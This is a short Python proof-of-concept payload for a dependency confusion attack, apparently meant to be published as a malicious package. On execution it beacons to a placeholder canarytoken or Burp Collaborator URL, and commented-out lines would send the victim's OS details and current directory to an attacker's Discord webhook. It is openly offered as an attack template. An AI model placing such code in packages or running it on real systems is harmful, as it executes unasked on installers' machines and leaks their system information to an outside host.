# python package dependency confiuse vulnerability POC 
# name: techghoshal
# e-mail: techghoshal@gmail.com
# Impact this vulnerability: Remote code execution(RCE)

	
from discord import SyncWebhook
import requests
import os

## canarytokens_url OR burp collaborator URL
requests.get("canarytokens_url")

## Send target info to your discord server 
#webhook = SyncWebhook.from_url("<discord_webhook_url>")

#osname =  os.uname()
#cwd = os.getcwd()

#webhook.send(f"OS-Info: {osname}")
#webhook.send(f"Current-DIR: {cwd}")
